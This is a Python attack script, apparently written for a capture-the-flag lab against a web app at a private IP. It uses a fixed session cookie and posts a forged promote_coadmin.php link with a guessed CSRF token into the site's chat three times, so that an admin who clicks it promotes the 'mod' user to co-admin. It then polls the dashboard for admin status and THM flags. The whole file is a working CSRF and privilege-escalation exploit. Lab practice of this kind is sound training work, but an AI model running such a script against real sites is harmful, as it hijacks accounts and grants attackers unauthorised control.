import re
import time
import requests

TARGET = 'http://10.82.129.17'
SID = 'k6qh5jtubf314jfo61sh1qk0d2'
PROMOTE = f"{TARGET}/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3"

s = requests.Session()
s.cookies.set('PHPSESSID', SID)

# Send promote link to admin via chat
for i in range(3):
    r = s.post(f'{TARGET}/chat.php', data={'message': PROMOTE}, allow_redirects=True, timeout=10)
    print('chat post', i+1, r.status_code, r.url)
    time.sleep(1)

# Poll dashboard for role/flags
for i in range(18):
    r = s.get(f'{TARGET}/dashboard.php', allow_redirects=True, timeout=10)
    flags = re.findall(r'THM\{[^}]+\}', r.text)
    is_admin = ('Hi, admin' in r.text) or ('>admin<' in r.text.lower()) or ('Role</th>' in r.text and 'admin' in r.text.lower())
    print(f'poll {i+1}: flags={flags} admin={is_admin}')
    if flags and any('M0dH@ck3dPawned007' not in f for f in flags):
        print('FOUND NEW FLAG', flags)
        break
    time.sleep(10)

# dump chat snippet for confirmation link stored
rc = s.get(f'{TARGET}/chat.php', allow_redirects=True, timeout=10)
idx = rc.text.find('chat-messages')
print('chat snippet:')
print(rc.text[idx:idx+1200])
